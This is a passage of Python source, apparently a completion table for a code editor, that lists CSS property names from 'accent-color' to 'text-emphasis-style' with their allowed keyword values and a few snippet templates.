\"kHz\",\n            \"%\",\n        ],\n        \"url\": [[\"url()\", \"url($1)\"]],\n    }\n\n\nprops = {\n        \"accent-color\": [\"auto\", \"\", \"\"],\n        \"additive-symbols\": [],\n        \"align-content\": [\n            \"center\",\n            \"flex-end\",\n            \"flex-start\",\n            \"space-around\",\n            \"space-between\",\n            \"stretch\",\n        ],\n        \"align-items\": [\"baseline\", \"center\", \"flex-end\", \"flex-start\", \"stretch\"],\n        \"align-self\": [\n            \"auto\",\n            \"baseline\",\n            \"center\",\n            \"flex-end\",\n            \"flex-start\",\n            \"stretch\",\n        ],\n        \"align-tracks\": [\"normal\"],\n        \"all\": [],\n        \"alt\": [],\n        \"animation\": [\n            \"\",\n            \"\",\n            \"\",\n            \"none\",\n            \"infinite\",\n            \"forwards\",\n            \"backwards\",\n            \"both\",\n            \"running\",\n            \"paused\",\n        ],\n        \"animation-delay\": [\"\"],\n        \"animation-direction\": [\"\"],\n        \"animation-duration\": [\"\"],\n        \"animation-fill-mode\": [\"none\", \"forwards\", \"backwards\", \"both\"],\n        \"animation-iteration-count\": [\n            \"\",\n            \"infinite\",\n        ],\n        \"animation-name\": [\n            \"none\",\n        ],\n        \"animation-play-state\": [\"running\", \"paused\"],\n        \"animation-timing-function\": [\"\", \"\"],\n        \"appearance\": [\"auto\", \"menulist-button\", \"none\", \"textfield\"],\n        \"aspect-ratio\": [\"auto\"],\n        \"azimuth\": [\n            \"\",\n            \"behind\",\n            \"center\",\n            \"center-left\",\n            \"center-right\",\n            \"far-left\",\n            \"far-right\",\n            \"left\",\n            \"left-side\",\n            \"leftwards\",\n            \"right\",\n            \"right-side\",\n            \"rightwards\",\n        ],\n        \"backdrop-filter\": [\"none\"],\n        \"backface-visibility\": [\"visible\", \"hidden\"],\n        \"background\": [\n            \"\",\n            \"\",\n            \"\",\n            \"\",\n            \"\",\n            \"\",\n            \"fixed\",\n            \"scroll\",\n        ],\n        \"background-attachment\": [\"fixed\", \"local\", \"scroll\"],\n        \"background-blend-mode\": [\"\"],\n        \"background-clip\": [\n            \"border-box\",\n            \"content-box\",\n            \"padding-box\",\n        ],\n        \"background-color\": [\"\"],\n        \"background-image\": [\"\", \"none\"],\n        \"background-origin\": [\n            \"border-box\",\n            \"content-box\",\n            \"padding-box\",\n        ],\n        \"background-position\": [\"\", \"\"],\n        \"background-position-x\": [\n            \"\",\n            \"center\",\n            \"left\",\n            \"right\",\n            \"x-end\",\n            \"x-start\",\n        ],\n        \"background-position-y\": [\n            \"\",\n            \"bottom\",\n            \"center\",\n            \"top\",\n            \"y-end\",\n            \"y-start\",\n        ],\n        \"background-repeat\": [\"\"],\n        \"background-size\": [\n            \"\",\n            \"auto\",\n            \"cover\",\n            \"contain\",\n        ],\n        \"behavior\": [],\n        \"bleed\": [\"auto\"],\n        \"block-size\": [\"\", \"auto\"],\n        \"border\": [\"\", \"\", \"\", \"\"],\n        \"border-block\": [\"\", \"\", \"\", \"\"],\n        \"border-block-color\": [\"\"],\n        \"border-block-end\": [\"\", \"\", \"\", \"\"],\n        \"border-block-end-color\": [\"\"],\n        \"border-block-end-style\": [\"\"],\n        \"border-block-end-width\": [\"\", \"\"],\n        \"border-block-start\": [\"\", \"\", \"\", \"\"],\n        \"border-block-start-color\": [\"\"],\n        \"border-block-start-style\": [\"\"],\n        \"border-block-start-width\": [\"\", \"\"],\n        \"border-block-style\": [\"\"],\n        \"border-block-width\": [\"\", \"\"],\n        \"border-bottom\": [\"\", \"\", \"\", \"\"],\n        \"border-bottom-color\": [\"\"],\n        \"border-bottom-left-radius\": [\"\"],\n        \"border-bottom-right-radius\": [\"\"],\n        \"border-bottom-style\": [\"\"],\n        \"border-bottom-width\": [\"\", \"\"],\n        \"border-collapse\": [\"collapse\", \"separate\"],\n        \"border-color\": [\"\"],\n        \"border-end-end-radius\": [\"\"],\n        \"border-end-start-radius\": [\"\"],\n        \"border-image\": [\n            \"\",\n            \"\",\n            \"auto\",\n            \"fill\",\n            \"none\",\n            \"repeat\",\n            \"round\",\n            \"space\",\n            \"stretch\",\n        ],\n        \"border-image-outset\": [],\n        \"border-image-repeat\": [\"stretch\", \"repeat\", \"round\", \"space\"],\n        \"border-image-slice\": [\n            \"\",\n            \"fill\",\n        ],\n        \"border-image-source\": [\"none\", \"\"],\n        \"border-image-width\": [\"\", \"auto\"],\n        \"border-inline\": [\"\", \"\", \"\", \"\"],\n        \"border-inline-color\": [\"\"],\n        \"border-inline-end\": [\"\", \"\", \"\", \"\"],\n        \"border-inline-end-color\": [\"\"],\n        \"border-inline-end-style\": [\"\"],\n        \"border-inline-end-width\": [\"\", \"\"],\n        \"border-inline-start\": [\n            \"\",\n            \"\",\n            \"\",\n            \"\",\n        ],\n        \"border-inline-start-color\": [\"\"],\n        \"border-inline-start-style\": [\"\"],\n        \"border-inline-start-width\": [\"\", \"\"],\n        \"border-inline-style\": [\"\"],\n        \"border-inline-width\": [\"\", \"\"],\n        \"border-left\": [\"\", \"\", \"\", \"\"],\n        \"border-left-color\": [\"\"],\n        \"border-left-style\": [\"\"],\n        \"border-left-width\": [\"\", \"\"],\n        \"border-radius\": [\"\"],\n        \"border-right\": [\"\", \"\", \"\", \"\"],\n        \"border-right-color\": [\"\"],\n        \"border-right-style\": [\"\"],\n        \"border-right-width\": [\"\", \"\"],\n        \"border-spacing\": [],\n        \"border-start-end-radius\": [\"\"],\n        \"border-start-start-radius\": [\"\"],\n        \"border-style\": [\"\"],\n        \"border-top\": [\"\", \"\", \"\", \"\"],\n        \"border-top-color\": [\"\"],\n        \"border-top-left-radius\": [\"\"],\n        \"border-top-right-radius\": [\"\"],\n        \"border-top-style\": [\"\"],\n        \"border-top-width\": [\"\", \"\"],\n        \"border-width\": [\"\", \"\"],\n        \"bottom\": [\"\", \"auto\"],\n        \"box-align\": [\"baseline\", \"center\", \"end\", \"start\", \"stretch\"],\n        \"box-decoration-break\": [\"slice\", \"clone\"],\n        \"box-direction\": [\"normal\", \"reverse\"],\n        \"box-flex\": [\"\"],\n        \"box-flex-group\": [\"\"],\n        \"box-lines\": [\"multiple\", \"single\"],\n        \"box-ordinal-group\": [\"\"],\n        \"box-orient\": [\"block-axis\", \"horizontal\", \"inline-axis\", \"vertical\"],\n        \"box-pack\": [\"center\", \"end\", \"justify\", \"start\"],\n        \"box-shadow\": [\"none\", \"inset\", \"\", \"\"],\n        \"box-sizing\": [\"content-box\", \"border-box\"],\n        \"break-after\": [\"\", \"\"],\n        \"break-before\": [\"\", \"\"],\n        \"break-inside\": [\"\"],\n        \"caption-side\": [\"top\", \"bottom\"],\n        \"caret-color\": [\"auto\", \"\"],\n        \"clear\": [\"none\", \"left\", \"right\", \"both\"],\n        \"clip\": [[\"rect()\", \"rect(${1:0}, ${2:0}, ${3:0}, ${4:0})\"], \"auto\"],\n        \"clip-path\": [\"none\", \"\", \"\"],\n        \"clip-rule\": [\"nonzero\", \"evenodd\"],\n        \"color\": [\"\"],\n        \"color-adjust\": [\"economy\", \"exact\"],\n        \"color-interpolation\": [\"auto\", \"sRGB\", \"linearRGB\"],\n        \"color-interpolation-filters\": [\"auto\", \"sRGB\", \"linearRGB\"],\n        \"column-count\": [\n            \"\",\n            \"auto\",\n        ],\n        \"column-fill\": [\"auto\", \"balance\"],\n        \"column-gap\": [\n            \"\",\n            \"normal\",\n        ],\n        \"column-rule\": [\"\", \"\", \"\", \"\"],\n        \"column-rule-color\": [\"\"],\n        \"column-rule-style\": [\"\"],\n        \"column-rule-width\": [\"\", \"\"],\n        \"column-span\": [\"\", \"none\"],\n        \"column-width\": [\n            \"\",\n            \"auto\",\n        ],\n        \"columns\": [\"\", \"auto\"],\n        \"contain\": [\"content\", \"layout\", \"none\", \"paint\", \"size\", \"strict\", \"style\"],\n        \"content\": [\n            \"none\",\n            \"normal\",\n            \"\",\n            \"\",\n            \"open-quote\",\n            \"close-quote\",\n            \"no-open-quote\",\n            \"no-close-quote\",\n            [\"attr()\", \"attr($1)\"],\n            [\"counter()\", \"counter($1)\"],\n        ],\n        \"content-visibility\": [\"auto\", \"hidden\", \"visible\"],\n        \"counter-increment\": [\n            \"\",\n            \"none\",\n        ],\n        \"counter-reset\": [\n            \"none\",\n        ],\n        \"counter-set\": [\"\", \"none\"],\n        \"cursor\": [\n            \"\",\n            \"auto\",\n            \"default\",\n            \"none\",\n            \"context-menu\",\n            \"help\",\n            \"pointer\",\n            \"progress\",\n            \"wait\",\n            \"cell\",\n            \"crosshair\",\n            \"text\",\n            \"vertical-text\",\n            \"alias\",\n            \"copy\",\n            \"move\",\n            \"no-drop\",\n            \"not-allowed\",\n            \"e-resize\",\n            \"n-resize\",\n            \"ne-resize\",\n            \"nw-resize\",\n            \"s-resize\",\n            \"se-resize\",\n            \"sw-resize\",\n            \"w-resize\",\n            \"ew-resize\",\n            \"ns-resize\",\n            \"nesw-resize\",\n            \"nwse-resize\",\n            \"col-resize\",\n            \"row-resize\",\n            \"all-scroll\",\n            \"zoom-in\",\n            \"zoom-out\",\n        ],\n        \"direction\": [\"ltr\", \"rtl\"],\n        \"display\": [\n            \"none\",\n            \"inline\",\n            \"inline-block\",\n            \"inline-table\",\n            \"inline-flex\",\n            \"inline-grid\",\n            \"block\",\n            \"contents\",\n            \"list-item\",\n            \"table\",\n            \"table-cell\",\n            \"table-column\",\n            \"table-column-group\",\n            \"table-footer-group\",\n            \"table-header-group\",\n            \"table-row\",\n            \"table-row-group\",\n            \"table-caption\",\n            \"flex\",\n            \"flow\",\n            \"flow-root\",\n            \"grid\",\n            \"ruby\",\n            \"ruby-base\",\n            \"ruby-text\",\n            \"ruby-base-container\",\n            \"ruby-text-container\",\n            \"run-in\",\n        ],\n        \"empty-cells\": [\"show\", \"hide\"],\n        \"enable-background\": [\"accumulate\", \"new\"],\n        \"fallback\": [],\n        \"fill\": [\"\"],\n        \"fill-opacity\": [\n            \"\",\n        ],\n        \"fill-rule\": [\"nonzero\", \"evenodd\"],\n        \"filter\": [\n            \"\",\n            [\"blur()\", \"blur(${1:5px})\"],\n            [\"brightness()\", \"brightness(${1:1.0})\"],\n            [\"contrast()\", \"contrast(${1:100%})\"],\n            [\"drop-shadow()\", \"drop-shadow(${1:1px} ${2:1px})\"],\n            [\"grayscale()\", \"grayscale(${1:50%})\"],\n            [\"hue-rotate()\", \"hue-rotate(${1:90deg})\"],\n            [\"invert()\", \"invert(${1:50%})\"],\n            [\"opacity()\", \"opacity(${1:100%})\"],\n            [\"saturate()\", \"saturate(${1:50%})\"],\n            [\"sepia()\", \"sepia(${1:50%})\"],\n        ],\n        \"flex\": [\n            \"\",\n            \"none\" \"auto\",\n        ],\n        \"flex-basis\": [\n            \"\",\n            \"auto\",\n        ],\n        \"flex-direction\": [\"row\", \"row-reverse\", \"column\", \"column-reverse\"],\n        \"flex-flow\": [\n            \"row\",\n            \"row-reverse\",\n            \"column\",\n            \"column-reverse\",\n            \"nowrap\",\n            \"wrap\",\n            \"wrap-reverse\",\n        ],\n        \"flex-grow\": [\n            \"\",\n        ],\n        \"flex-shrink\": [\n            \"\",\n        ],\n        \"flex-wrap\": [\"nowrap\", \"wrap\", \"wrap-reverse\"],\n        \"float\": [\n            \"left\",\n            \"right\",\n            \"none\",\n            \"inline-start\",\n            \"inline-end\",\n        ],\n        \"flood-color\": [\"\"],\n        \"flood-opacity\": [\n            \"\",\n        ],\n        \"font\": [\n            \"\",\n            \"\",\n            \"\",\n            \"\",\n            \"caption\",\n            \"icon\",\n            \"italic\",\n            \"menu\",\n            \"message-box\",\n            \"oblique\",\n            \"small-caps\",\n            \"small-caption\",\n            \"status-bar\",\n        ],\n        \"font-display\": [\"auto\", \"block\", \"fallback\", \"optional\", \"swap\"],\n        \"font-family\": [\"\"],\n        \"font-feature-settings\": [\"normal\", \"\"],\n        \"font-kerning\": [\"auto\", \"normal\", \"none\"],\n        \"font-language-override\": [\"normal\", \"\"],\n        \"font-optical-sizing\": [\"auto\", \"none\"],\n        \"font-size\": [\n            \"\",\n            \"\",\n            \"\",\n        ],\n        \"font-size-adjust\": [\n            \"\",\n            \"none\",\n        ],\n        \"font-smooth\": [\"always\", \"auto\", \"never\"],\n        \"font-stretch\": [\n            \"normal\",\n            \"semi-condensed\",\n            \"condensed\",\n            \"extra-condensed\",\n            \"ultra-condensed\",\n            \"semi-expanded\",\n            \"expanded\",\n            \"extra-expanded\",\n            \"ultra-expanded\",\n        ],\n        \"font-style\": [\"normal\", \"italic\", \"oblique\"],\n        \"font-synthesis\": [\"none\", \"weight\", \"style\"],\n        \"font-variant\": [\"normal\", \"small-caps\"],\n        \"font-variant-alternates\": [\"\"],\n        \"font-variant-caps\": [\n            \"normal\",\n            \"small-caps\",\n            \"all-small-caps\",\n            \"petite-caps\",\n            \"all-petite-caps\",\n            \"unicase\",\n            \"titling-case\",\n        ],\n        \"font-variant-east-asian\": [\n            \"normal\",\n            \"ruby\",\n            \"jis78\",\n            \"jis83\",\n            \"jis90\",\n            \"jis04\",\n            \"simplified\",\n            \"traditional\",\n        ],\n        \"font-variant-ligatures\": [\n            \"normal\",\n            \"none\",\n            \"common-ligatures\",\n            \"no-common-ligatures\",\n            \"discretionary-ligatures\",\n            \"no-discretionary-ligatures\",\n            \"historical-ligatures\",\n            \"no-historical-ligatures\",\n            \"contextual\",\n            \"no-contextual\",\n        ],\n        \"font-variant-numeric\": [\n            \"normal\",\n            \"ordinal\",\n            \"slashed-zero\",\n            \"lining-nums\",\n            \"oldstyle-nums\",\n            \"proportional-nums\",\n            \"tabular-nums\",\n            \"diagonal-fractions\",\n            \"stacked-fractions\",\n        ],\n        \"font-variant-position\": [\"normal\", \"sub\", \"super\"],\n        \"font-variation-settings\": [\"normal\"],\n        \"font-weight\": [\"\", \"\"],\n        \"forced-color-adjust\": [\"auto\", \"none\"],\n        \"gap\": [\n            \"\",\n        ],\n        \"glyph-orientation-horizontal\": [\"auto\"],\n        \"glyph-orientation-vertical\": [\"auto\"],\n        \"grid\": [\n            \"\",\n            \"\",\n            \"auto\",\n            \"auto-flow\",\n            \"dense\",\n            \"span\",\n        ],\n        \"grid-area\": [\n            \"\",\n            \"\",\n            \"auto\",\n            \"span\",\n        ],\n        \"grid-auto-columns\": [\n            \"\",\n            \"\",\n            \"auto\",\n        ],\n        \"grid-auto-flow\": [\"row\", \"column\", \"dense\"],\n        \"grid-auto-rows\": [\n            \"\",\n            \"\",\n            \"auto\",\n        ],\n        \"grid-column\": [\n            \"\",\n            \"auto\",\n            \"span\",\n        ],\n        \"grid-column-end\": [\n            \"\",\n            \"auto\",\n            \"span\",\n        ],\n        \"grid-column-gap\": [\n            \"\",\n            \"auto\",\n            \"span\",\n        ],\n        \"grid-column-start\": [\n            \"\",\n            \"auto\",\n            \"span\",\n        ],\n        \"grid-gap\": [\n            \"\",\n        ],\n        \"grid-row\": [\n            \"\",\n            \"auto\",\n            \"span\",\n        ],\n        \"grid-row-end\": [\n            \"\",\n            \"auto\",\n            \"span\",\n        ],\n        \"grid-row-gap\": [\n            \"\",\n        ],\n        \"grid-row-start\": [\n            \"\",\n            \"auto\",\n            \"span\",\n        ],\n        \"grid-template\": [\n            \"\",\n            \"\",\n            \"auto\",\n            \"max-content\",\n            \"min-content\",\n            \"none\",\n            \"subgrid\",\n        ],\n        \"grid-template-areas\": [\n            \"auto\",\n            \"\",\n            \"\",\n        ],\n        \"grid-template-columns\": [\n            \"auto\",\n            \"\",\n            \"\",\n        ],\n        \"grid-template-rows\": [\n            \"auto\",\n            \"\",\n            \"\",\n        ],\n        \"hanging-punctuation\": [\"allow-end\", \"first\", \"force-end\", \"last\", \"none\"],\n        \"height\": [\"\", \"auto\", \"fit-content\"],\n        \"hyphens\": [\"none\", \"manual\", \"auto\"],\n        \"image-orientation\": [\"flip\", \"from-image\"],\n        \"image-rendering\": [\"auto\", \"optimizeSpeed\", \"optimizeQuality\", \"pixelated\"],\n        \"image-resolution\": [\"from-image\"],\n        \"ime-mode\": [\"auto\", \"normal\", \"active\", \"inactive\", \"disabled\"],\n        \"inherits\": [\"false\", \"true\"],\n        \"initial-letter\": [\"normal\"],\n        \"initial-letter-align\": [\"alphabetic\", \"auto\", \"hanging\", \"ideographic\"],\n        \"initial-value\": [\n            \"\",\n        ],\n        \"inline-size\": [\"\", \"auto\"],\n        \"inset\": [],\n        \"inset-block\": [],\n        \"inset-block-end\": [],\n        \"inset-block-start\": [],\n        \"inset-inline\": [],\n        \"inset-inline-end\": [],\n        \"inset-inline-start\": [],\n        \"isolation\": [\"auto\", \"isolation\"],\n        \"justify-content\": [\"\"],\n        \"justify-items\": [\"\"],\n        \"justify-self\": [],\n        \"justify-tracks\": [\"left\", \"normal\", \"right\"],\n        \"kerning\": [\"\", \"auto\"],\n        \"left\": [\"\", \"auto\"],\n        \"letter-spacing\": [\n            \"\",\n            \"normal\",\n        ],\n        \"lighting-color\": [\"\"],\n        \"line-break\": [\"anywhere\", \"auto\", \"loose\", \"normal\", \"strict\"],\n        \"line-clamp\": [\"\", \"none\"],\n        \"line-height\": [\n            \"\",\n            \"normal\",\n        ],\n        \"line-height-step\": [\n            \"\",\n        ],\n        \"list-style\": [\n            \"\",\n            \"\" \"inside\",\n            \"outside\",\n        ],\n        \"list-style-image\": [\"\", \"none\"],\n        \"list-style-position\": [\"inside\", \"outside\"],\n        \"list-style-type\": [\"\"],\n        \"margin\": [\n            \"\",\n            \"auto\",\n        ],\n        \"margin-block\": [\n            \"\",\n        ],\n        \"margin-block-end\": [\"\", \"auto\"],\n        \"margin-block-start\": [\"\", \"auto\"],\n        \"margin-bottom\": [\n            \"\",\n            \"auto\",\n        ],\n        \"margin-inline\": [\n            \"\",\n        ],\n        \"margin-inline-end\": [\"\", \"auto\"],\n        \"margin-inline-start\": [\"\", \"auto\"],\n        \"margin-left\": [\n            \"\",\n            \"auto\",\n        ],\n        \"margin-right\": [\n            \"\",\n            \"auto\",\n        ],\n        \"margin-top\": [\n            \"\",\n            \"auto\",\n        ],\n        \"margin-trim\": [\"all\", \"in-flow\", \"none\"],\n        \"marker\": [\"\", \"none\"],\n        \"marker-end\": [\"\", \"none\"],\n        \"marker-mid\": [\"\", \"none\"],\n        \"marker-start\": [\"\", \"none\"],\n        \"marks\": [\"crop\", \"cross\", \"none\"],\n        \"mask\": [\"\", \"\", \"none\"],\n        \"mask-border\": [\n            \"\",\n        ],\n        \"mask-border-mode\": [\"alpha\", \"luminance\"],\n        \"mask-border-outset\": [],\n        \"mask-border-repeat\": [\"repeat\", \"round\", \"space\", \"stretch\"],\n        \"mask-border-slice\": [],\n        \"mask-border-source\": [\"none\"],\n        \"mask-border-width\": [\"\", \"auto\"],\n        \"mask-clip\": [\"no-clip\"],\n        \"mask-composite\": [],\n        \"mask-image\": [\"\", \"none\"],\n        \"mask-mode\": [\"alpha\", \"auto\", \"luminance\"],\n        \"mask-origin\": [\n            \"\",\n        ],\n        \"mask-position\": [\n            \"\",\n        ],\n        \"mask-repeat\": [\"\"],\n        \"mask-size\": [\"\", \"auto\", \"contain\", \"cover\"],\n        \"mask-type\": [\"luminance\", \"alpha\"],\n        \"masonry-auto-flow\": [\"definite-first\", \"next\", \"ordered\", \"pack\"],\n        \"math-style\": [\"compact\", \"normal\"],\n        \"max-block-size\": [\"\", \"none\"],\n        \"max-height\": [\"\", \"fit-content\", \"none\"],\n        \"max-inline-size\": [\"\", \"none\"],\n        \"max-lines\": [\"\", \"none\"],\n        \"max-width\": [\"\", \"fit-content\", \"none\"],\n        \"max-zoom\": [\"\", \"auto\"],\n        \"min-block-size\": [\n            \"\",\n        ],\n        \"min-height\": [\"\", \"fit-content\"],\n        \"min-inline-size\": [\n            \"\",\n        ],\n        \"min-width\": [\"\", \"fit-content\"],\n        \"min-zoom\": [\"\", \"auto\"],\n        \"mix-blend-mode\": [\"\"],\n        \"motion\": [[\"path()\", \"path($1)\"], \"auto\", \"none\", \"reverse\"],\n        \"motion-offset\": [\n            \"\",\n        ],\n        \"motion-path\": [[\"path()\", \"path($1)\"], \"none\"],\n        \"motion-rotation\": [\"auto\", \"reverse\"],\n        \"nav-down\": [\"auto\", \"current\", \"root\"],\n        \"nav-index\": [\"auto\"],\n        \"nav-left\": [\"auto\", \"current\", \"root\"],\n        \"nav-right\": [\"auto\", \"current\", \"root\"],\n        \"nav-up\": [\"auto\", \"current\", \"root\"],\n        \"negative\": [],\n        \"object-fit\": [\"fill\", \"contain\", \"cover\", \"none\", \"scale-down\"],\n        \"object-position\": [\"\", \"\"],\n        \"offset\": [\n            \"\",\n        ],\n        \"offset-anchor\": [\"\", \"auto\"],\n        \"offset-block-end\": [\"\", \"auto\"],\n        \"offset-block-start\": [\"\", \"auto\"],\n        \"offset-distance\": [\n            \"\",\n        ],\n        \"offset-inline-end\": [\"\", \"auto\"],\n        \"offset-inline-start\": [\"\", \"auto\"],\n        \"offset-path\": [\"\", \"none\"],\n        \"offset-position\": [\"\", \"auto\"],\n        \"offset-rotate\": [\"\", \"auto\", \"reverse\"],\n        \"opacity\": [\n            \"\",\n        ],\n        \"order\": [],\n        \"orientation\": [\"auto\", \"landscape\", \"portrait\"],\n        \"orphans\": [],\n        \"outline\": [\n            \"\",\n            \"\",\n            \"\",\n            \"\",\n        ],\n        \"outline-color\": [\"\", \"invert\"],\n        \"outline-offset\": [\"\"],\n        \"outline-style\": [\"\"],\n        \"outline-width\": [\n            \"\",\n            \"\",\n        ],\n        \"overflow\": [\"visible\", \"hidden\", \"scroll\", \"auto\"],\n        \"overflow-anchor\": [\"auto\", \"none\"],\n        \"overflow-block\": [\"auto\", \"clip\", \"hidden\", \"scroll\", \"visible\"],\n        \"overflow-clip-box\": [\"content-box\", \"padding-box\"],\n        \"overflow-inline\": [\"auto\", \"clip\", \"hidden\", \"scroll\", \"visible\"],\n        \"overflow-wrap\": [\"normal\", \"break-word\"],\n        \"overflow-x\": [\"visible\", \"hidden\", \"scroll\", \"auto\"],\n        \"overflow-y\": [\"visible\", \"hidden\", \"scroll\", \"auto\"],\n        \"overscroll-behavior\": [\"auto\", \"contain\", \"none\"],\n        \"overscroll-behavior-block\": [\"auto\", \"contain\", \"none\"],\n        \"overscroll-behavior-inline\": [\"auto\", \"contain\", \"none\"],\n        \"overscroll-behavior-x\": [\"auto\", \"contain\", \"none\"],\n        \"overscroll-behavior-y\": [\"auto\", \"contain\", \"none\"],\n        \"pad\": [\n            \"\",\n        ],\n        \"padding\": [\"\", \"auto\"],\n        \"padding-block\": [\n            \"\",\n        ],\n        \"padding-block-end\": [\n            \"\",\n        ],\n        \"padding-block-start\": [\n            \"\",\n        ],\n        \"padding-bottom\": [\"\", \"auto\"],\n        \"padding-inline\": [\n            \"\",\n        ],\n        \"padding-inline-end\": [\n            \"\",\n        ],\n        \"padding-inline-start\": [\n            \"\",\n        ],\n        \"padding-left\": [\"\", \"auto\"],\n        \"padding-right\": [\"\", \"auto\"],\n        \"padding-top\": [\"\", \"auto\"],\n        \"page-break-after\": [\"auto\", \"always\", \"avoid\", \"left\", \"right\"],\n        \"page-break-before\": [\"auto\", \"always\", \"avoid\", \"left\", \"right\"],\n        \"page-break-inside\": [\"avoid\", \"auto\"],\n        \"paint-order\": [\"normal\", \"fill\", \"stroke\", \"markers\"],\n        \"perspective\": [\"none\"],\n        \"perspective-origin\": [\"\", \"\"],\n        \"place-content\": [],\n        \"place-items\": [],\n        \"place-self\": [],\n        \"pointer-events\": [\n            \"auto\",\n            \"none\",\n            \"all\",\n            \"visiblePainted\",\n            \"visibleFill\",\n            \"visibleStroke\",\n            \"visible\",\n            \"painted\",\n            \"fill\",\n            \"stroke\",\n        ],\n        \"position\": [\"static\", \"relative\", \"absolute\", \"fixed\", \"sticky\"],\n        \"prefix\": [],\n        \"print-color-adjust\": [\"economy\", \"exact\"],\n        \"quotes\": [\"none\", \"\"],\n        \"range\": [\"auto\", \"infinite\"],\n        \"resize\": [\"none\", \"both\", \"horizontal\", \"vertical\"],\n        \"right\": [\"\", \"auto\"],\n        \"rotate\": [\"\", \"none\"],\n        \"row-gap\": [\"\", \"normal\"],\n        \"ruby-align\": [\n            \"auto\",\n            \"center\",\n            \"distribute-letter\",\n            \"distribute-space\",\n            \"left\",\n            \"line-edge\",\n            \"right\",\n            \"space-around\",\n            \"space-between\",\n            \"start\",\n        ],\n        \"ruby-merge\": [\"auto\", \"collapse\", \"separate\"],\n        \"ruby-overhang\": [\"auto\", \"end\", \"none\", \"start\"],\n        \"ruby-position\": [\n            \"after\",\n            \"before\",\n            \"inline\",\n            \"inter-character\",\n            \"over\",\n            \"right\",\n            \"under\",\n        ],\n        \"ruby-span\": [[\"attr()\", \"attr($1)\"], \"\", \"none\"],\n        \"scale\": [\"\", \"none\"],\n        \"scroll-behavior\": [\"auto\", \"smooth\"],\n        \"scroll-margin\": [\"\"],\n        \"scroll-margin-block\": [\"\"],\n        \"scroll-margin-block-end\": [\"\"],\n        \"scroll-margin-block-start\": [\"\"],\n        \"scroll-margin-bottom\": [\"\"],\n        \"scroll-margin-inline\": [\"\"],\n        \"scroll-margin-inline-end\": [\"\"],\n        \"scroll-margin-inline-start\": [\"\"],\n        \"scroll-margin-left\": [\"\"],\n        \"scroll-margin-right\": [\"\"],\n        \"scroll-margin-top\": [\"\"],\n        \"scroll-padding\": [\"auto\", \"\"],\n        \"scroll-padding-block\": [\"auto\", \"\"],\n        \"scroll-padding-block-end\": [\"auto\", \"\"],\n        \"scroll-padding-block-start\": [\"auto\", \"\"],\n        \"scroll-padding-bottom\": [\"auto\", \"\"],\n        \"scroll-padding-inline\": [\"auto\", \"\"],\n        \"scroll-padding-inline-end\": [\"auto\", \"\"],\n        \"scroll-padding-inline-start\": [\"auto\", \"\"],\n        \"scroll-padding-left\": [\"auto\", \"\"],\n        \"scroll-padding-right\": [\"auto\", \"\"],\n        \"scroll-padding-top\": [\"auto\", \"\"],\n        \"scroll-snap-align\": [\"center\", \"end\", \"none\", \"start\"],\n        \"scroll-snap-coordinate\": [\"none\"],\n        \"scroll-snap-destination\": [],\n        \"scroll-snap-points-x\": [[\"repeat()\", \"repeat($1)\"], \"none\"],\n        \"scroll-snap-points-y\": [[\"repeat()\", \"repeat($1)\"], \"none\"],\n        \"scroll-snap-stop\": [\"always\", \"normal\"],\n        \"scroll-snap-type\": [\n            \"block\",\n            \"both\",\n            \"inline\",\n            \"mandatory\",\n            \"none\",\n            \"proximity\",\n        ],\n        \"scroll-snap-type-x\": [\"mandatory\", \"none\", \"proximity\"],\n        \"scroll-snap-type-y\": [\"mandatory\", \"none\", \"proximity\"],\n        \"scrollbar-3dlight-color\": [\"\"],\n        \"scrollbar-arrow-color\": [\"\"],\n        \"scrollbar-base-color\": [\"\"],\n        \"scrollbar-color\": [\"auto\", \"dark\", \"light\", \"\"],\n        \"scrollbar-darkshadow-color\": [\"\"],\n        \"scrollbar-face-color\": [\"\"],\n        \"scrollbar-gutter\": [\"always\", \"auto\", \"stable\"],\n        \"scrollbar-highlight-color\": [\"\"],\n        \"scrollbar-shadow-color\": [\"\"],\n        \"scrollbar-track-color\": [\"\"],\n        \"scrollbar-width\": [\"auto\", \"none\", \"thin\", \"\"],\n        \"shape-image-threshold\": [],\n        \"shape-margin\": [\"\"],\n        \"shape-outside\": [\n            \"none\",\n            \"margin-box\",\n            \"content-box\",\n            \"border-box\",\n            \"padding-box\",\n            \"\",\n            \"\",\n        ],\n        \"shape-rendering\": [\n            \"auto\",\n            \"optimizeSpeed\",\n            \"crispEdges\",\n            \"geometricPrecision\",\n        ],\n        \"size\": [\n            \"a3\",\n            \"a4\",\n            \"a5\",\n            \"b4\",\n            \"b5\",\n            \"jis-b4\",\n            \"jis-b5\",\n            \"landscape\",\n            \"ledger\",\n            \"legal\",\n            \"letter\",\n            \"portrait\",\n        ],\n        \"speak-as\": [\"auto\", \"bullets\", \"numbers\", \"spell-out\", \"words\"],\n        \"src\": [[\"format()\", \"format($1)\"], [\"local()\", \"local($1)\"], \"\"],\n        \"stop-color\": [\"\"],\n        \"stop-opacity\": [\"\"],\n        \"stroke\": [\"\", \"\"],\n        \"stroke-dasharray\": [\"none\"],\n        \"stroke-dashoffset\": [],\n        \"stroke-linecap\": [\"butt\", \"round\", \"square\"],\n        \"stroke-linejoin\": [\"round\", \"miter\", \"bevel\"],\n        \"stroke-miterlimit\": [\"\"],\n        \"stroke-opacity\": [\"\"],\n        \"stroke-width\": [\"\"],\n        \"suffix\": [],\n        \"symbols\": [],\n        \"syntax\": [],\n        \"system\": [\"\"],\n        \"tab-size\": [\"\"],\n        \"table-layout\": [\"auto\", \"fixed\"],\n        \"text-align\": [\"left\", \"right\", \"center\", \"justify\", \"justify-all\"],\n        \"text-align-last\": [\"start\", \"end\", \"left\", \"right\", \"center\", \"justify\"],\n        \"text-anchor\": [\"start\", \"middle\", \"end\"],\n        \"text-combine-upright\": [\"all\", \"digits\", \"none\"],\n        \"text-decoration\": [\"none\", \"underline\", \"overline\", \"line-through\", \"blink\"],\n        \"text-decoration-color\": [\"\"],\n        \"text-decoration-line\": [\"none\", \"underline\", \"overline\", \"line-through\"],\n        \"text-decoration-skip\": [\n            \"box-decoration\",\n            \"edges\",\n            \"leading-spaces\",\n            \"none\",\n            \"objects\",\n            \"spaces\",\n            \"trailing-spaces\",\n        ],\n        \"text-decoration-skip-ink\": [\"all\", \"auto\", \"none\"],\n        \"text-decoration-style\": [\"solid\", \"double\", \"dotted\", \"dashed\", \"wavy\"],\n        \"text-decoration-thickness\": [\"auto\", \"from-font\"],\n        \"text-emphasis\": [\n            \"\",\n            \"\",\n            \"\",\n        ],\n        \"text-emphasis-color\": [\n            \"\",\n        ],\n        \"text-emphasis-position\": [\"left\", \"over\", \"right\", \"under\"],\n        \"text-emphasis-style\": [\"\", 